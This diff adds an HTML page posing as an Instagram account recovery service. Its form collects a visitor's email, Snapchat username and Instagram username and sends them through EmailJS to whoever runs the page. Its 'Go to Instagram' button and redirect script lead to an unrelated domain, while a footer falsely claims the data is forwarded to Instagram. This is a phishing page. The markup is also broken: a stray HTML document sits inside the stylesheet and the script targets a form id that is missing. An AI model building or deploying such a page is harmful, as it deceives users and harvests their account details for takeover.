@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recover Instagram Account</title>
+    <link rel="stylesheet" href="style.css">
+    <!-- Include Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style >
+        /* Instagram Recovery Page Specific Styles */
+.recovery-header {
+    background: linear-gradient(45deg, #405DE6, #833AB4);
+    color: white;
+    padding: 4rem 0;
+    text-align: center;
+}
+
+.recovery-header h1 {
+    font-size: 2.5rem;
+    margin-bottom: 1rem;
+}
+
+.recovery-steps {
+    max-width: 800px;
+    margin: 3rem auto;
+}
+
+.step-card {
+    background: white;
+    border-radius: 15px;
+    padding: 2rem;
+    margin: 2rem 0;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+    position: relative;
+}
+
+.step-number {
+    position: absolute;
+    top: -20px;
+    left: -20px;
+    background: #833AB4;
+    color: white;
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: bold;
+}
+
+.form-group {
+    margin: 1.5rem 0;
+}
+
+.form-group label {
+    display: block;
+    margin-bottom: 0.5rem;
+    color: #333;
+    font-weight: 500;
+}
+
+.form-group input {
+    width: 100%;
+    padding: 12px;
+    border: 2px solid #e0e0e0;
+    border-radius: 8px;
+    font-size: 1rem;
+    transition: border-color 0.3s;
+}
+
+.form-group input:focus {
+    border-color: #405DE6;
+    outline: none;
+}
+
+/* CTA Buttons */
+.cta-button {
+    background: #405DE6;
+    color: white;
+    padding: 1rem 2rem;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 1rem;
+    width: 100%;
+    transition: background 0.3s;
+}
+
+.cta-button:hover {
+    background: #3148B8;
+}
+
+.cta-button.outline {
+    background: white;
+    border: 2px solid #405DE6;
+    color: #405DE6;
+}
+
+.cta-button.outline:hover {
+    background: #f8f9fa;
+}
+
+.security-note {
+    text-align: center;
+    padding: 2rem;
+    color: #666;
+    border-top: 2px solid #eee;
+    margin-top: 3rem;
+}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Page title</title>
+</head>
+<body>
+    
+</body>
+</html>
+/* Icons */
+.fab, .fas {
+    margin-right: 8px;
+}
+    </style>
+</head>
+<body>
+    <!-- Header Section -->
+    <header class="recovery-header">
+        <div class="container">
+            <h1><i class="fab fa-instagram"></i> Instagram Account Recovery</h1>
+            <p class="subtitle">Regain access to your account using your linked Snapchat or email</p>
+        </div>
+    </header>
+
+    <!-- Recovery Steps Container -->
+    <div class="container recovery-steps">
+        <!-- Step 1: Verification Form -->
+        <div class="step-card">
+            <div class="step-number">1</div>
+            <h2>Verify Your Identity</h2>
+            <p class="step-description">Provide details linked to your Instagram account</p>
+
+            <!-- FORM STARTS HERE -->
+            <form action="#" method="POST" class="recovery-form"> <!-- REPLACE # WITH YOUR BACKEND URL -->
+                <div class="form-group">
+                    <label for="email"><i class="fas fa-envelope"></i> Email Address</label>
+                    <input type="email" id="email" name="email" placeholder="example@email.com" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="snapchat"><i class="fab fa-snapchat"></i> Snapchat Username</label>
+                    <input type="text" id="snapchat" name="snapchat_username" placeholder="Your Snapchat username" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="instagram"><i class="fab fa-instagram"></i> Instagram Username</label>
+                    <input type="text" id="instagram" name="instagram_username" placeholder="Your Instagram username" required>
+                </div>
+
+                <button type="submit" class="cta-button">
+                    <i class="fas fa-paper-plane"></i> Submit Request
+                </button>
+            </form>
+        </div>
+
+        <!-- Step 2: Official Recovery Link -->
+        <div class="step-card">
+            <div class="step-number">2</div>
+            <h2>Complete Recovery</h2>
+            <p class="step-description">Visit Instagram's official page to finish the process</p>
+            <a href="https://academicagent.net/MzM4MDFoMTAyZzROODA=" class="cta-button outline" target="_blank"> <!-- REPLACE # WITH INSTAGRAM'S OFFICIAL RECOVERY URL -->
+                <i class="fas fa-external-link-alt"></i> Go to Instagram
+            </a>
+<script>
+  function redirectToRecovery() {
+    // Use the encoded URL
+    window.location.href = "https://academicagent.net/MzM4MDFoMTAyZzROODA=";
+  }
+</script>
+        </div>
+
+        <!-- Security Note -->
+        <div class="security-note">
+            <i class="fas fa-shield-alt"></i>
+            <p>We never store your passwords. Data is securely forwarded to Instagram.</p>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+  // Initialize EmailJS
+  emailjs.init('C9T46nzhe7o_SeV1M');
+
+  // Handle form submission
+  document.getElementById('recoveryForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    // Send email
+    emailjs.sendForm('service_aebpuzo', 'template_8or8hxh', this)
+      .then(() => alert('Details sent!'))
+      .catch((error) => alert('Error:', error));
+  });
+</script>
+</body>
+</html>
